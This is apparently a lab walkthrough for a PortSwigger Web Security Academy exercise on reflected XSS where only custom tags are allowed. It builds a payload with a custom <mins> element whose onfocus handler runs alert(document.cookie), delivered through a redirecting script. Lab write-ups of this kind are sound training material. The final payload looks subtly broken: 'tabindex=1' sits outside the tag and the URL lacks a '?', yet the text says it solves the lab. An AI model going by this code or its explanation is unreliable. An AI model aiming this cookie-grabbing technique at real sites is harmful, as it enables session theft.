### Reflected XSS into HTML context with all tags blocked except custom ones : PRACTITIONER

---

We need to create a custom tag to solve this lab, can't use `iframe` in the exploit server.

- We create a `script` manually, and insert in it the `location` variable that redirects the script to the address in it.
- We set its location to the lab and insert the search parameter where we will inject the payload.
```
<script> location = "https://0abc00ce0377f43f8328cd54009500e5.web-security-academy.net/search="; </script>
```

> The next step is to create our own element, as any other will get rejected. Moreover, we need an event that when triggered, will cause our `alert()` function to be called with the `document.cookie`.

```
<mins>
```
- Let `<mins>` be our custom self closing tag.


Use the event `onfocus`, which triggers when you TAB over to it.
- To make this work, we need to include an `id` for our element, and call that id in the URL for it to autofocus once we open the webpage.
```
<mins id=omar>
```

Setting the event handler for the element.
```
<mins id=omar onfocus=alert(document.cookie)>
```

Now putting it all together.
```
<script> location = "https://0abc00ce0377f43f8328cd54009500e5.web-security-academy.net/search= <mins id=omar onfocus=alert(document.cookie)> #omar"; </script>
```
- We add the `#omar` in the end to autofocus to our element for the event to be called.

> It still doesn't work, as we need by default the browser to not head to it. We need for it to TAB over to our element, therefore, we set the default TAB value to 1, so once we load, the 1 then CHANGES to our element, triggering the event.

Do that using `tabindex`.
```
<script> location = "https://0abc00ce0377f43f8328cd54009500e5.web-security-academy.net/search= <mins id=omar onfocus=alert(document.cookie)> tabindex=1 #omar"; </script>
```

We deliver this exploit to victim, and the popup shows and the lab is complete.

---
